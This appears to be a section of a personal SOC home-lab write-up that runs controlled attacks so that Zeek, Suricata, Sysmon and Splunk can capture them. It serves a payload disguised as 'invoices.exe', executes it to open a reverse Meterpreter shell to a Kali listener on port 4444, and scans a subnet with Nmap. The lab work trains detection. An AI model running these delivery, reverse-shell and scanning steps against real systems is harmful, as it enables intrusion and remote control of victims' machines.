# Attack Simulation
This section documents the practical execution of controlled attacks inside the lab using the payloads created earlier. The goal is to generate realistic adversarial activity that can be observed by Zeek, Suricata, pfSense, Sysmon, and Splunk, giving me hands-on experience in traffic analysis, detection, and investigation.

## Objective of Attack Simulation
Once the payloads were created, the next step was to actually run them in the lab environment to produce the telemetry needed for SOC analysis.

### This phase focuses on:
- Delivering the payload
- Triggering callback behavior
- Observing endpoint execution
- Monitoring attacker techniques
- Generating logs across multiple sensors
- Producing data for detection and correlation in Splunk

This is where the lab starts reflecting real attacker behavior.

## Delivering the Payload to the Windows Victim
With the HTTP server running on Kali:

```
python3 -m http.server 9999
```

I browsed to the payload location from the Windows machine:

```
http://192.168.1.250:9999/invoices.exe
```

Downloading or executing the payload triggered:

- Sysmon process creation events
- Zeek HTTP logs
- Suricata HTTP traffic alerts
- Firewall logs on pfSense

This is exactly the type of multi-source telemetry a SOC analyst investigates.

## Executing the Payload

```
.\invoices.exe
```

The payload initiated its reverse TCP callback back to Kali on port 4444.

This generated:

- Zeek conn.log
- Zeek ssl.log (if encrypted)
- Suricata eve.json signatures
- Windows Sysmon network connection + process execution logs

## Meterpreter Session Establishment

Metasploit listener:

```
msfconsole -r scripts/msf_handler.rc
```

Captured the callback, resulting in:

```
[*] Meterpreter session 1 opened
```

From here, I could explore typical attacker behaviors such as:

- Process listing
- System enumeration
- File system access
- Persistence techniques
- Command execution

Every action creates valuable logs for Splunk and the SOC workflow.

Screenshots of session output can be stored in:

```
attack-simulation/screenshots/
```

## Network Scanning with Nmap

To create additional telemetry, I performed an Nmap scan from Kali:

```
nmap -A 192.168.1.0/24
```

These scans simulate common attacker reconnaissance techniques (MITRE ATT&CK T1046).

## What This Phase Achieved

Running these attacks allowed me to:

✔ Understand how attackers behave on the network

✔ See how monitoring tools capture that behavior

✔ Generate noise for building detections

✔ Correlate activity across multiple logs

✔ Train for real SOC investigations

✔ Build my confidence across the entire attack lifecycle

This simulation is the foundation for the next section: running structured Atomic Red Team tests.

# Appendix: : Visual Evidence For Attack Simulation and NMAP

### Metasploit

![meta-image](https://github.com/user-attachments/assets/5170ad62-bdd0-471c-8544-d9b735a17d48)

![metasploit-image](https://github.com/user-attachments/assets/f03bb4de-ca16-45a4-bd69-a199583d0eb0)

### NMAP Scan

![nmap-scan](https://github.com/user-attachments/assets/be6c73d2-d6ec-42e7-8ca6-6404ea4efe8f)

![nmap-scan1](https://github.com/user-attachments/assets/d2a7aef6-b26f-4dfb-9e8f-e01cdfd211c4)





























